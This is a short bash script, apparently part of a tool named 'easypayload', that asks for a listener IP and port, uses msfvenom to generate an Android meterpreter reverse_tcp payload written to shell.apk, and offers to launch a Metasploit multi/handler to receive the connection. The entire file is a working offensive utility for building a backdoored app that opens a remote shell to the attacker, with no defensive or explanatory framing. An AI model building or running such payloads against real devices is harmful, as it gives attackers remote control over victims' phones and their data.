echo "enter Listiner IP"
read ip
echo "Enter Listiner PORT"
read port
cd ..
cd output
msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f exe > shell.apk
echo "shell.apk created in output folder"
cd ..
#TO START THE HANDLER
echo "Do you want to start listner now?(1 for Yes/ 2 for No)"
read op
case $op in 
	1)
	msfconsole -q -x "use exploit/multi/handler;set PAYLOAD android/meterpreter/reverse_tcp; set LHOST $ip; set LPORT $port; run" ;; 
	2)
	bash easypayload.sh ;;
	*)echo "Wrong option! "
	bash easypayload.sh ;;
esac
